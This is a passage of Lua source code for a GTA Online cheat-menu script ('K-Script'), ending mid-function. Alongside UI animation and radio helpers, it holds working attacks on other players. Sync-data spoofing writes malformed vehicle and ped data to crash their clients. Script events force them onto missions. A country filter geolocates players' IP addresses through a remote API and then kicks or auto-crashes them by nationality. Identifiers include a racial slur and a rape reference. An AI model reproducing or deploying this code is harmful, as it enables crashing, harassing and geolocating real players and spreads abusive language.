FeatAdd(Utils.Joaat("unloadKScript"), "Unload K-Script", eFeatureType.Button, "Unload K-Script.", function()
  SetShouldUnload()
end)

function resetTabFrameState()
  activeTabPath = ""
  tabBarDepth = 0
  activeTabLabelsByDepth = {}
  slideAppliedThisFrame = false
end

function updateFeatureTransitionAnimation()
  if not GUI.IsOpen or not GUI.IsOpen() then
    cursorPos = 0
    fadeContentAlpha = 1
    pendingContentSlide = false
    return
  end

  if isFeatureEnabled("FeatureTransitions") then
    local speed = math.max(0.001, getFeatureFloat("FeatureTransitionsTransitionSpeed", 0.07))
    cursorPos = lerp(tonumber(cursorPos) or 0, 0, math.min(1, speed))
    if math.abs(cursorPos) < 0.5 then
      cursorPos = 0
      pendingContentSlide = false
    end
  else
    cursorPos = 0
    pendingContentSlide = false
  end

  if isFeatureEnabled("FadeContent") then
    local speed = math.max(0.001, getFeatureFloat("FadeContentFadeSpeed", 0.75))
    fadeContentAlpha = lerp(tonumber(fadeContentAlpha) or 1, 1, math.min(1, speed * 0.08))
    if fadeContentAlpha > 0.995 then
      fadeContentAlpha = 1
    end
  else
    fadeContentAlpha = 1
  end
end

if not kscriptUiHandlersRegistered then
  Logger.Log(eLogColor.GREEN, "K-Script", "Registering UI/Event Handlers...")

  pcall(EventMgr.RegisterHandler, eLuaEvent.ON_PRESENT, renderImGui)
  pcall(EventMgr.RegisterHandler, eLuaEvent.ON_PRESENT, renderToasts)
  pcall(EventMgr.RegisterHandler, eLuaEvent.ON_PRESENT, resetTabFrameState)
  pcall(EventMgr.RegisterHandler, eLuaEvent.ON_PRESENT, updateFeatureTransitionAnimation)
  pcall(EventMgr.RegisterHandler, eLuaEvent.ON_REACTION, onReaction)
  pcall(EventMgr.RegisterHandler, eLuaEvent.ON_WEAPON_CHANGE, onWeaponChangeAngelAI)
  pcall(EventMgr.RegisterHandler, eLuaEvent.ON_PLAYER_PED_RESPAWN, onPedRespawnAngelAI)

  if isDev then
    pcall(EventMgr.RegisterHandler, eLuaEvent.CAN_APPLY_NODE_DATA, NodeDataLogUtillity)
  end

  Script.RegisterLooped(RenderModeWatcher)
  kscriptUiHandlersRegistered = true
end

SIZEOF_NUM_EVENTS = 2
SIZEOF_OBJECTID = 13
SIZEOF_OBJECTTYPE = 4
SIZEOF_MIGRATION_TYPE = 3
MAX_OBJECTS_PER_EVENT = 3

eMigrationTypeNames = {
  [0] = "MIGRATE_PROXIMITY",
  [1] = "MIGRATE_OUT_OF_SCOPE",
  [2] = "MIGRATE_SCRIPT",
  [3] = "MIGRATE_FORCED",
  [4] = "MIGRATE_REASSIGNMENT",
  [5] = "MIGRATE_FROZEN_PED",
}

function canMigrate(entity, enabled)
  if entity == nil or entity == 0 then
    return false
  end

  local netId = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity)
  if netId == nil or netId == 0 then
    return false
  end

  return NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netId, enabled == true)
end

vehicleFlyTarget = vehicleFlyTarget or nil
vehicleFlyControlPending = vehicleFlyControlPending or false

function getControl()
  if ShouldUnload() then
    Script.Yield(100)
    return
  end

  if vehicleFlyTarget == nil or not isFeatureEnabled("vehicleflymode") then
    vehicleFlyControlPending = false
    vehicleFlyTarget = nil
    Script.Yield(500)
    return
  end

  if ENTITY.IS_ENTITY_A_PED(vehicleFlyTarget) or ENTITY.IS_ENTITY_AN_OBJECT(vehicleFlyTarget) then
    vehicleFlyTarget = nil
    vehicleFlyControlPending = false
    Script.Yield(500)
    return
  end

  if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vehicleFlyTarget) then
    vehicleFlyControlPending = true
    local deadline = Time.GetEpocheMs() + 300
    repeat
      NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicleFlyTarget)
      Script.Yield(50)
    until NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vehicleFlyTarget) or Time.GetEpocheMs() >= deadline or ShouldUnload()
  end

  vehicleFlyControlPending = false
  vehicleFlyTarget = nil
  Script.Yield(150)
end

function ShouldCollideHandler(entityHandle, entityPointer)
  if entityHandle == GTA.GetLocalVehicle() and isFeatureEnabled("vehicleflymode") and GTA.PointerToHandle then
    local ok, handle = pcall(GTA.PointerToHandle, entityPointer)
    if ok and handle and handle ~= 0 then
      vehicleFlyTarget = handle
    end
  end

  return true
end

ensureToggleFeature("vehicleflymode", "Better Vehicle Fly", "Allows ramming other entities while using vehicle fly.", false, function(feature)
  if not feature:IsToggled() then
    vehicleFlyTarget = nil
    vehicleFlyControlPending = false
  end
end)

function forcePlayerOntoMission(playerId, activityId)
  local args = {
    SCRIPT_EVENT.SCRIPT_EVENT_FORCE_PLAYER_ONTO_MISSION or SCRIPT_EVENT.FORCE_PLAYER_ONTO_MISSION or 0,
    GTA.GetLocalPlayerId(),
    1 << playerId,
    tonumber(activityId) or 0,
  }
  return GTA.TriggerScriptEvent(1 << playerId, args)
end

function invitePlayerOntoMission(playerId, activityId)
  local args = {
    SCRIPT_EVENT.SCRIPT_EVENT_INVITE_TO_MISSION or SCRIPT_EVENT.INVITE_TO_MISSION or 0,
    GTA.GetLocalPlayerId(),
    1 << playerId,
    tonumber(activityId) or 0,
  }
  return GTA.TriggerScriptEvent(1 << playerId, args)
end

function launchMission(playerId)
  local args = {
    SCRIPT_EVENT.SCRIPT_EVENT_CONFIRMATION_LAUNCH_MISSION or SCRIPT_EVENT.CONFIRMATION_LAUNCH_MISSION or 0,
    GTA.GetLocalPlayerId(),
    1 << playerId,
  }

  for index = 4, 26 do
    args[index] = 0
  end

  return GTA.TriggerScriptEvent(1 << playerId, args)
end

local function registerActivityBypassFeatures()
  if kscriptActivityBypassFeaturesRegistered then
    return
  end

  for activityId, activityName in pairs(activities) do
    PlayerFeatAdd(Utils.Joaat(activityName), activityName, eFeatureType.Button, "", function(feature)
      local playerId = feature:GetPlayerIndex()
      local target = Players.GetById(playerId)
      if not target or playerId == GTA.GetLocalPlayerId() then
        return
      end

      local gamerInfo = target:GetGamerInfo()
      if gamerInfo and blacklistRIDList[gamerInfo.RockstarId] and not isDev then
        blacklistSound()
        SendToDiscord("protection", ("%s(%i) tried to use an activity bypass on protected player %s."):format(
          Players.GetName(GTA.GetLocalPlayerId()),
          Cherax.GetUID(),
          Players.GetName(playerId)
        ))
        return
      end

      invitePlayerOntoMission(playerId, activityId)
      launchMission(playerId)
      SendToDiscord("activity", ("%s used Activity Bypass: %s against %s with UID %i."):format(
        PLAYER.GET_PLAYER_NAME(GTA.GetLocalPlayerId()),
        tostring(activityName),
        Players.GetName(playerId) or tostring(playerId),
        Cherax.GetUID()
      ))
    end, true)
  end

  kscriptActivityBypassFeaturesRegistered = true
end

registerActivityBypassFeatures()

function getGiveControlEventData(reader, sender)
  local event = {
    sender = sender,
    senderId = sender and sender.PlayerId or nil,
    m_giveControlData = {},
  }

  local value, ok = reader:ReadUns(32)
  if not ok then return false end
  event.physicalPlayersBitmask = value
  event.m_PhysicalPlayersBitmask = value

  value, ok = reader:ReadUns(SIZEOF_NUM_EVENTS)
  if not ok then return false end
  event.numControlData = math.min(value, MAX_OBJECTS_PER_EVENT)
  event.m_numControlData = event.numControlData

  value, ok = reader:ReadBool()
  if not ok then return false end
  event.allObjectsMigrateTogether = value
  event.m_bAllObjectsMigrateTogether = value

  for index = 1, event.numControlData do
    local item = {}

    value, ok = reader:ReadUns(SIZEOF_OBJECTID)
    if not ok then return false end
    item.objectId = value
    item.m_objectID = value

    value, ok = reader:ReadUns(SIZEOF_OBJECTTYPE)
    if not ok then return false end
    item.objectType = value
    item.m_objectType = value
    item.objectTypeName = eNetObjectTypeNames[value] or "UNKNOWN"

    value, ok = reader:ReadUns(SIZEOF_MIGRATION_TYPE)
    if not ok then return false end
    item.migrationType = value
    item.m_migrationType = value
    item.migrationTypeName = eMigrationTypeNames[value] or "UNKNOWN"

    event.m_giveControlData[index] = item
  end

  if isDev or isFeatureEnabled("dbug") then
    local senderName = sender and sender.GetName and sender:GetName() or "Unknown"
    Logger.Log(eLogColor.CYAN, "K-Script [DEBUG]", "========== CGiveControlEvent ==========")
    Logger.Log(eLogColor.CYAN, "K-Script [DEBUG]", "senderName = " .. tostring(senderName))
    Logger.Log(eLogColor.CYAN, "K-Script [DEBUG]", "m_PhysicalPlayersBitmask = " .. tostring(event.m_PhysicalPlayersBitmask))
    Logger.Log(eLogColor.CYAN, "K-Script [DEBUG]", "m_numControlData = " .. tostring(event.m_numControlData))

    for index, item in ipairs(event.m_giveControlData) do
      Logger.Log(eLogColor.CYAN, "K-Script [DEBUG]", ("m_giveControlData[%d].m_objectID = %s (0x%X)"):format(index - 1, tostring(item.m_objectID), item.m_objectID))
      Logger.Log(eLogColor.CYAN, "K-Script [DEBUG]", ("m_giveControlData[%d].m_objectType = %s"):format(index - 1, tostring(item.objectTypeName)))
      Logger.Log(eLogColor.CYAN, "K-Script [DEBUG]", ("m_giveControlData[%d].m_migrationType = %s"):format(index - 1, tostring(item.migrationTypeName)))
    end

    Logger.Log(eLogColor.CYAN, "K-Script [DEBUG]", "=========================================")
  end

  return event
end

function redirectGiveControlevent(event)
  if not event or not event.m_giveControlData or not event.m_giveControlData[1] then
    Logger.LogError("redirectGiveControlevent received an invalid event.")
    return
  end

  local target = event.m_giveControlData[1]
  Logger.LogInfo(("Redirecting give-control event for objectID 0x%X"):format(target.m_objectID or 0))

  Script.QueueJob(function()
    if event.numControlData and event.numControlData > 1 then
      return
    end

    local localPlayer = Players.GetById(GTA.GetLocalPlayerId())
    local netObject = NetworkObjectMgr.GetNetworkObject(target.m_objectID, true)
    if not localPlayer or not netObject then
      return
    end

    if CGiveControlEventTrigger and Memory.LuaCallCFunction then
      pcall(Memory.LuaCallCFunction, CGiveControlEventTrigger, localPlayer, netObject, 3)
    end
  end)
end

if table.contains == nil then
  function table.contains(values, needle)
    if values == nil then
      return false
    end

    for _, value in ipairs(values) do
      if value == needle then
        return true
      end
    end

    return false
  end
end

countryHashes = countryHashes or {}
EnabledCountries = EnabledCountries or {}
searchQuery = searchQuery or ""
filteredCountries = filteredCountries or {}
purificationFeature = purificationFeature or nil
purificationEnabled = purificationEnabled or false
purificationJoinHandler = purificationJoinHandler or nil
playersJoinTime = playersJoinTime or {}
IPLookupState = IPLookupState or {}

countriesToKick = countriesToKick or {
  "Afghanistan", "Algeria", "American Samoa", "American Virgin Islands", "Anguilla",
  "Antigua and Barbuda", "Argentina", "Armenia", "Ascension Island", "Australia",
  "Austria", "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados",
  "Belarus", "Belgium", "Bhutan", "Brazil", "British Virgin Islands", "Brunei",
  "Bulgaria", "Cambodia", "Canada", "Cayman Islands", "Chile", "China",
  "Christmas Island", "Cocos (Keeling) Islands", "Colombia", "Cook Islands",
  "Costa Rica", "Croatia", "Cuba", "Czech Republic", "Denmark", "Dominica",
  "Dominican Republic", "Egypt", "El Salvador", "Estonia", "Faroe Islands",
  "Fiji", "Finland", "France", "French Polynesia", "Georgia", "Germany",
  "Ghana", "Gibraltar", "Greenland", "Grenada", "Guatemala", "Guernsey",
  "Honduras", "Hungary", "India", "Indonesia", "Iran", "Iraq", "Ireland",
  "Israel", "Italy", "Jamaica", "Japan", "Jersey", "Jordan", "Kazakhstan",
  "Kenya", "Kiribati", "Kuwait", "Kyrgyzstan", "Laos", "Latvia", "Lebanon",
  "Lithuania", "Maldives", "Malaysia", "Marshall Islands", "Mexico",
  "Micronesia", "Moldova", "Mongolia", "Montserrat", "Morocco", "Myanmar",
  "NA", "Nauru", "Nepal", "Netherlands", "New Caledonia", "New Zealand",
  "Nicaragua", "Nigeria", "Niue", "Norfolk Island", "North Korea", "Norway",
  "Oman", "Pakistan", "Palau", "Palestine", "Panama", "Papua New Guinea",
  "Peru", "Philippines", "Pitcairn Islands", "Poland", "Portugal",
  "Puerto Rico", "Qatar", "Romania", "Russia", "Rwanda", "Saint Helena",
  "Saint Kitts and Nevis", "Saint Lucia", "Saint Vincent and the Grenadines",
  "Samoa", "Saudi Arabia", "Senegal", "Serbia", "Seychelles", "Singapore",
  "Slovakia", "Slovenia", "Solomon Islands", "South Africa",
  "South Georgia and the South Sandwich Islands", "South Korea", "Spain",
  "Sri Lanka", "Sudan", "Sweden", "Switzerland", "Syria", "Tajikistan",
  "Tanzania", "Thailand", "Timor-Leste", "Togo", "Tokelau", "Tonga",
  "Trinidad and Tobago", "Tunisia", "Turkey", "Turkmenistan", "Tuvalu",
  "Uganda", "Ukraine", "United Arab Emirates", "United Kingdom",
  "United States", "Uruguay", "Uzbekistan", "Vanuatu", "Vatican City",
  "Venezuela", "Vietnam", "Wallis and Futuna", "Yemen", "Zambia", "Zimbabwe",
}

countryCodeMap = countryCodeMap or {
  HK = "China", MO = "China", TW = "China",
  PR = "United States", GU = "United States", VI = "United States",
  RE = "France", GP = "France", MQ = "France", PF = "France", NC = "France",
  CW = "Netherlands", AW = "Netherlands",
  JE = "United Kingdom", GG = "United Kingdom", IM = "United Kingdom",
  BM = "United Kingdom", KY = "United Kingdom", GI = "United Kingdom",
}

function normalizeCountry(country, countryCode)
  if country == nil then
    return nil
  end

  country = tostring(country):gsub("^%s+", ""):gsub("%s+$", "")
  if countryCode and countryCodeMap[countryCode] then
    return countryCodeMap[countryCode]
  end

  return country
end

function isCountryEnabled(country)
  local normalized = normalizeCountry(country)
  return normalized ~= nil and table.contains(EnabledCountries, normalized)
end

function rebuildEnabledCountries()
  EnabledCountries = {}

  for _, country in ipairs(countriesToKick) do
    local hash = countryHashes[country]
    local feature = hash and FeatureMgr.GetFeature(hash) or nil
    if feature and feature.IsToggled and feature:IsToggled() then
      table.insert(EnabledCountries, country)
    end
  end
end

function CheckIPLocation(targetIp, callback)
  local function finish(data)
    if callback then
      callback(data)
    end
  end

  Script.QueueJob(function()
    if not ensureApiAuthenticated("CheckIPLocation", SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()) then
      finish(nil)
      return
    end

    local curl = Curl.Easy()
    curl:Setopt(eCurlOption.CURLOPT_URL, API_BASE .. "/checkIpLocation")
    curl:Setopt(eCurlOption.CURLOPT_POST, 1)
    curl:Setopt(eCurlOption.CURLOPT_POSTFIELDS, json.encode({
      cherax_uid = Cherax.GetUID(),
      targetIP = tostring(targetIp),
    }))
    addAuthHeaders(curl)
    curl:Setopt(eCurlOption.CURLOPT_USERAGENT, "K-Script V61")
    curl:DisableErrorLog()
    curl:Perform()

    if not waitForCurl(curl, 5) then
      finish(nil)
      return
    end

    local code, response = curl:GetResponse()
    response = response or ""

    if responseNeedsApiRefresh(response) then
      if refreshApiKey("CheckIPLocation", SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()) then
        CheckIPLocation(targetIp, callback)
      else
        finish(nil)
      end
      return
    end

    if code ~= eCurlCode.CURLE_OK or response == "" then
      finish(nil)
      return
    end

    local ok, decoded = pcall(json.decode, response)
    if ok and type(decoded) == "table" and decoded.success == true then
      finish(decoded.data)
    else
      finish(nil)
    end
  end)
end

local function punishCountryMatch(playerId, country)
  if not table.contains(EnabledCountries, country) then
    return
  end

  local playerName = Players.GetName(playerId) or ("Player " .. tostring(playerId))
  if isFeatureEnabled("SessionPurifierAutocrash") then
    for _, featureName in ipairs({"crash Player", "Auxiliary Cannon crash", "Script Event crash"}) do
      local feature = FeatureMgr.GetFeatureByName and FeatureMgr.GetFeatureByName(featureName, playerId) or nil
      if feature and feature.TriggerCallback then
        pcall(feature.TriggerCallback, feature)
      end
    end
    notify(("crashed %s (%s)"):format(playerName, tostring(country)))
  else
    NETWORK.NETWORK_SESSION_KICK_PLAYER(playerId)
    notify(("Kicked %s (%s)"):format(playerName, tostring(country)))
  end
end

function punishPlayer(playerId)
  if playerId == GTA.GetLocalPlayerId() then
    return
  end

  local ipInfo = Players.GetIPInfo(playerId)
  if not ipInfo then
    return
  end

  local country = normalizeCountry(ipInfo.country, ipInfo.countryCode)
  if country == "NA" or country == "Unknown" or country == "Hidden" then
    local ip = Players.GetIPString and Players.GetIPString(playerId) or nil
    if ip == nil or ip == "" then
      return
    end

    local lookupKey = tostring(playerId) .. ":" .. tostring(ip)
    if IPLookupState[lookupKey] then
      return
    end

    IPLookupState[lookupKey] = true
    CheckIPLocation(ip, function(result)
      IPLookupState[lookupKey] = nil
      if result and result.country then
        punishCountryMatch(playerId, normalizeCountry(result.country, result.countryCode))
      end
    end)
    return
  end

  punishCountryMatch(playerId, country)
end

function onPurificationPlayerJoin(playerId)
  if not purificationEnabled then
    return
  end

  rebuildEnabledCountries()
  if #EnabledCountries > 0 then
    punishPlayer(playerId)
  end
end

local function registerPurificationFeatures()
  if kscriptPurificationFeaturesRegistered then
    return
  end

  for _, country in ipairs(countriesToKick) do
    local hash = Utils.Joaat(country)
    countryHashes[country] = hash
    FeatAdd(hash, country, eFeatureType.Toggle, "Block players from " .. country, function(feature)
      local enabled = feature:IsToggled()
      local alreadyEnabled = table.contains(EnabledCountries, country)
      if enabled and not alreadyEnabled then
        table.insert(EnabledCountries, country)
      elseif not enabled and alreadyEnabled then
        for index = #EnabledCountries, 1, -1 do
          if EnabledCountries[index] == country then
            table.remove(EnabledCountries, index)
          end
        end
      end
    end, false)
  end

  FeatAdd(Utils.Joaat("SessionPurifierAutocrash"), "Auto crash", eFeatureType.Toggle, "Automatically runs selected player actions instead of a session kick.")
  FeatAdd(Utils.Joaat("purification_search"), "Purification Search", eFeatureType.InputText, "Search for a country to filter.")

  purificationFeature = FeatAdd(Utils.Joaat("PurificationMain"), "Get these players out of my session", eFeatureType.Toggle, "Kick or act on players from selected countries.", function(feature)
    purificationEnabled = feature:IsToggled()

    if purificationEnabled then
      rebuildEnabledCountries()
      if #EnabledCountries == 0 then
        notify("No countries selected!")
        purificationEnabled = false
        feature:SetBoolValue(false)
        return
      end

      if purificationJoinHandler == nil then
        purificationJoinHandler = EventMgr.RegisterHandler(eLuaEvent.ON_PLAYER_JOIN, onPurificationPlayerJoin)
      end
    elseif purificationJoinHandler ~= nil then
      EventMgr.RemoveHandler(purificationJoinHandler)
      purificationJoinHandler = nil
    end
  end)

  kscriptPurificationFeaturesRegistered = true
end

registerPurificationFeatures()

function processPurificationMain()
  if ShouldUnload() then
    purificationEnabled = false
    if purificationJoinHandler ~= nil then
      EventMgr.RemoveHandler(purificationJoinHandler)
      purificationJoinHandler = nil
    end
    return
  end

  if purificationFeature == nil or not purificationFeature:IsToggled() or not purificationEnabled or initRun then
    Script.Yield(2000)
    return
  end

  rebuildEnabledCountries()
  if #EnabledCountries == 0 then
    notify("No countries selected!")
    purificationEnabled = false
    purificationFeature:SetBoolValue(false)
    if purificationJoinHandler ~= nil then
      EventMgr.RemoveHandler(purificationJoinHandler)
      purificationJoinHandler = nil
    end
    return
  end

  Script.Yield(1000)
end

party_buses = party_buses or {}
static_buses = static_buses or {}
volume = volume or 4
size = size or 1
height = height or -5.3
heightp = heightp or 0
rot = rot or 90
yaw = yaw or 90
roll = roll or 0
xOffset = xOffset or 1
yOffset = yOffset or 1
current_radio_station = current_radio_station or "RADIO_12_CLASS_ROCK"

radioStations = radioStations or {
  "RADIO_89_CLASS_ROCK", "RADIO_68_POP", "RADIO_69_HIPHOP_NEW", "RADIO_04_PUNK",
  "RADIO_83_TALK_89", "RADIO_95_COUNTRY", "RADIO_07_DANCE_01", "RADIO_86_MEXICAN",
  "RADIO_21_HIPHOP_OLD", "RADIO_22_TALK_13", "RADIO_45_REGGAE", "RADIO_79_JAZZ",
  "RADIO_58_DANCE_46", "RADIO_60_MOTOWN", "RADIO_49_SILVERLAKE", "RADIO_95_FUNK",
  "RADIO_96_78S_ROCK", "RADIO_53_USER", "RADIO_75_THELAB", "RADIO_21_DLC_XM17",
  "RADIO_33_DLC_BATTLE_MIX2_RADIO", "RADIO_01_DLC_XM97_RADIO", "RADIO_16_DLC_PRHEI3",
  "RADIO_23_DLC_HEI3_KULT", "RADIO_35_DLC_HEI4_MLR", "RADIO_47_AUDIOPLAYER",
  "RADIO_71_MOTOMAMI",
}

function getRadioStationNumber(stationName)
  for index, name in ipairs(radioStations) do
    if name == stationName then
      return index
    end
  end
  return nil
end

function animation(delta, target, current)
  if delta == 0 then
    return current
  end

  local nextValue = current + ((target + delta) - current)
  Script.Yield()
  return nextValue
end

local function cleanRadioEntities()
  for _, pool in ipairs({party_buses, static_buses}) do
    for _, entity in ipairs(pool) do
      DeleteEnt(entity)
      Script.Yield()
    end
  end

  party_buses = {}
  static_buses = {}
end

local louderRadioRunning = false

local function runLouderRadio(feature)
  if louderRadioRunning then
    return
  end

  louderRadioRunning = true

  while feature:IsToggled() and not ShouldUnload() do
    local station = AUDIO.GET_PLAYER_RADIO_STATION_NAME()
    if station and station ~= "" then
      current_radio_station = station
    end

    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(GTA.GetLocalPlayerId())
    if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
      local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
      local speed = ENTITY.GET_ENTITY_SPEED(vehicle)
      local vx, vy, vz = ENTITY.GET_ENTITY_VELOCITY(vehicle)
      local rx, ry, rz = ENTITY.GET_ENTITY_ROTATION(ped, 0)

      if (speed * 2.236936) > 15 then
        ENTITY.FREEZE_ENTITY_POSITION(vehicle, true)
        Script.Yield(1)
        ENTITY.FREEZE_ENTITY_POSITION(vehicle, false)
        ENTITY.SET_ENTITY_ROTATION(vehicle, rx, ry, rz, 0, true)
        ENTITY.SET_ENTITY_VELOCITY(vehicle, vx, vy, vz)
      end
    end

    Script.Yield(500)
  end

  cleanRadioEntities()
  louderRadioRunning = false
end

local function registerLouderRadioFeatures()
  if kscriptLouderRadioFeaturesRegistered then
    return
  end

  FeatAdd(Utils.Joaat("louderRadion_Toggle"), "Enable Louder Radio", eFeatureType.Toggle, "Control louder radio helper objects.", function(feature)
    if feature:IsToggled() then
      Script.QueueJob(runLouderRadio, feature)
    else
      cleanRadioEntities()
    end
  end)

  local volumeFeature = FeatAdd(Utils.Joaat("louderRadio_volume"), "Volume", eFeatureType.SliderInt, "")
  callFeature(volumeFeature, "SetLimitValues", 1, 50)
  callFeature(volumeFeature, "SetIntValue", volume)

  local sizeFeature = FeatAdd(Utils.Joaat("louderRadio_size"), "Size", eFeatureType.SliderInt, "")
  callFeature(sizeFeature, "SetLimitValues", 1, 100)
  callFeature(sizeFeature, "SetIntValue", size)

  ensureToggleFeature("louderRadio_visibillityToggle", "Visible", "Show helper objects.", false)
  ensureToggleFeature("louderRadio_groundToggle", "Ground", "Keep helper objects near the ground.", true)
  ensureToggleFeature("louderRadio_collisionToggle", "Collision", "Enable helper object collision.", true)
  ensureToggleFeature("louderRadio_animToggle", "Animation", "Animate helper objects.", true)

  kscriptLouderRadioFeaturesRegistered = true
end

registerLouderRadioFeatures()

advancedDrawingEnabled = advancedDrawingEnabled or false
advancedDrawingSuppressed = advancedDrawingSuppressed or false
previousModderDisplayState = previousModderDisplayState or false
previousGameInfoDisplayState = previousGameInfoDisplayState or false

ensureToggleFeature("disabledraw", "Advanced Drawing", "Auto disables info windows in interiors, shops, calls, cutscenes, and phone apps.", false, function(feature)
  advancedDrawingEnabled = feature:IsToggled()
end)

local function isPhoneOrMenuOpen()
  if AUDIO.IS_MOBILE_PHONE_CALL_ONGOING() then
    return true
  end

  for _, scriptName in ipairs({"appinternet", "appcamera"}) do
    if SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(Utils.Joaat(scriptName)) > 0 then
      return true
    end
  end

  return false
end

function processAdvancedDrawing()
  if ShouldUnload() then
    return
  end

  advancedDrawingEnabled = isFeatureEnabled("disabledraw")

  if not advancedDrawingEnabled then
    Script.Yield(2000)
    return
  end

  if isNetPlayerOk(GTA.GetLocalPlayerId()) then
    local inShop = getPlayerCurrentShop(GTA.GetLocalPlayerId()) ~= -1
    local inInterior = getPlayerCurrentInterior(GTA.GetLocalPlayerId())
    local inGasStation = tableContainsValue(gasstationids, inInterior)
    local inCutscene = CUTSCENE.IS_CUTSCENE_ACTIVE() or CUTSCENE.IS_CUTSCENE_PLAYING()
    local pauseMenuState = ScriptLocal.GetInt(Utils.Joaat("am_pi_menu"), 1779) ~= 0
    local shouldSuppress = inShop or inGasStation or inCutscene or pauseMenuState or isPhoneOrMenuOpen() or inInterior == 275201

    if shouldSuppress and not advancedDrawingSuppressed then
      previousModderDisplayState = modderDisplay
      previousGameInfoDisplayState = gameInfoDisplay
      modderDisplay = false
      gameInfoDisplay = false
      advancedDrawingSuppressed = true
    elseif not shouldSuppress and advancedDrawingSuppressed then
      modderDisplay = previousModderDisplayState
      gameInfoDisplay = previousGameInfoDisplayState
      previousModderDisplayState = false
      previousGameInfoDisplayState = false
      advancedDrawingSuppressed = false
    end
  end

  Script.Yield(500)
end

function updateFeatureTransitionPostPresent()
  local frameRate = ImGui.GetFrameRate()
  if frameRate <= 0 then
    frameRate = 60
  end

  local guiOpen = GUI.IsOpen and GUI.IsOpen()
  local guiTab = ClickGUI and ClickGUI.GetActiveMenuTab and ClickGUI.GetActiveMenuTab() or nil
  local path = activeTabPath
  if path == nil or path == "" then
    path = tostring(currentTab)
  end

  if isFeatureEnabled("FeatureTransitions") then
    local speed = getFeatureFloat("FeatureTransitionsTransitionSpeed", 0.07)
    local startPosition = getFeatureInt("FeatureTransitionsPosition", -100)

    if cursorPos < -1 then
      cursorPos = lerp(cursorPos, 1, speed * (82 / frameRate))
      if cursorPos > -1 then
        cursorPos = -1
      end
    else
      cursorPos = -1
    end

    if not guiOpen then
      cursorPos = -1
      pendingContentSlide = false
    elseif path ~= lastActiveTabPath or guiTab ~= lastGUITab then
      cursorPos = startPosition
      pendingContentSlide = true
    end

    lastActiveTabPath = path
    lastTab = currentTab
    lastGUITab = guiTab
  else
    pendingContentSlide = false
    cursorPos = -1
    lastActiveTabPath = path
    lastTab = currentTab
    lastGUITab = guiTab
  end

  if isFeatureEnabled("FadeContent") then
    local speed = getFeatureFloat("FadeContentFadeSpeed", 0.75)
    if fadeContentAlpha < 1 then
      fadeContentAlpha = fadeContentAlpha + ((speed / 50) * (82 / frameRate))
      if fadeContentAlpha > 1 then
        fadeContentAlpha = 1
      end
    else
      fadeContentAlpha = 1
    end

    if not guiOpen then
      fadeContentAlpha = 1
    elseif path ~= fadeLastTab or guiTab ~= fadeLastGUITab then
      fadeContentAlpha = getFeatureFloat("FadeContentFadeInitialValue", 0.125)
    end

    fadeLastTab = path
    fadeLastGUITab = guiTab
  else
    fadeContentAlpha = 1
    fadeLastTab = path
    fadeLastGUITab = guiTab
  end
end

local function isPlayerFeatureEnabled(featureName, playerId)
  local ok, enabled = pcall(FeatureMgr.IsFeatureEnabled, Utils.Joaat(featureName), playerId)
  return ok and enabled == true
end

function shouldTriggerExclusiveSync(playerId, event)
  if (isSupporter or isAdmin) then
    for _, featureName in ipairs({"rapeLexis", "InvalidPhoneGesture8", "InvalidMComp7"}) do
      if isPlayerFeatureEnabled(featureName, playerId) then
        return true
      end
    end
  end

  local objectId = event and event.NetObject and event.NetObject.ObjectID or nil
  if objectId ~= nil then
    if tableContainsValue(niggerVeh, objectId) then
      return true
    end

    if spoofedVehicle and tableContainsValue(spoofedVehicle, objectId) then
      return true
    end

    if spoofedPed ~= nil and objectId == spoofedPed then
      return true
    end
  end

  return spoofedPid[playerId] == true
end

local function writeFilledBuffer(buffer, count, value)
  if buffer == nil then
    return
  end

  for index = 1, count do
    buffer[index] = value
  end
end

function onSyncDataNode(nodeType, node, object, shouldMutate, playerId)
  if not shouldMutate then
    return
  end

  if nodeType == eSyncDataNode.CVehicleHealthDatanode then
    local objectId = object and object.NetObject and object.NetObject.ObjectID
    if spoofedPid[playerId] and objectId and tableContainsValue(niggerVeh, objectId) then
      node.hasMaxhealth = true
      node.health = -100000000
      node.suspensionHealth = -100000
      node.tyreHealthDefault = 0
      node.numWheels = 6
      notify("Spoofing CVehicleHealthDatanode...")
    end
    return
  end

  if nodeType == eSyncDataNode.CVehicleTaskDataNode then
    if spoofedPid[playerId] and not isPlayerFeatureEnabled("rapeLexis", playerId) then
      notify(isDev and "Spoofing CVehicleTaskDataNode..." or "Vehicle task sync active...")
      node.taskType = 492
      node.taskDataSize = 256
      writeFilledBuffer(node.taskData, 50, 91337420)
    end
    return
  end

  if nodeType == eSyncDataNode.CVehicleProximityMigrationDataNode then
    if spoofedPid[playerId] and not isPlayerFeatureEnabled("rapeLexis", playerId) then
      notify(isDev and "Spoofing CVehicleProximityMigrationDataNode..." or "Vehicle migration sync active...")
      node.hasTaskData = true
      node.hasPopType = true
      node.PopType = math.random(0, 4294967295)
      node.taskType = 492
      node.packedVelocityX = -10
      node.packedVelocityY = -10
      node.packedVelocityZ = -10
      node.taskMigrationDataSize = 256
      writeFilledBuffer(node.taskMigrationData, 50, 91337420)
    end
    return
  end

  if nodeType == eSyncDataNode.CPedCreationDataNode then
    local objectId = object and object.NetObject and object.NetObject.ObjectID
    if spoofedPid[playerId] and spoofedPed ~= nil and objectId == spoofedPed then
      node.modelHash = 1653710254
      node.hasProp = true
      node.propHash = 20754026
    end
    return
  end

  if not (isSupporter or isAdmin) then
    return
  end

  if nodeType == eSyncDataNode.CPedTaskTreeDataNode and isPlayerFeatureEnabled("rapeLexis", playerId) then
    node.scriptCommand = math.random(0, 75)
    node.taskSlotsUsed = math.random(1, 8)
    node.taskStage = math.random(0, 6)

    for index = 1, node.taskSlotsUsed do
      local task = node.taskTreeData and node.taskTreeData[index]
      if task then
        task.taskActive = true
        task.taskPriority = math.random(0, 3)
        task.taskSequenceId = math.random(0, 31)
        task.taskType = 57
      end
    end

    notify("Ped task sync active...")
    return
  end

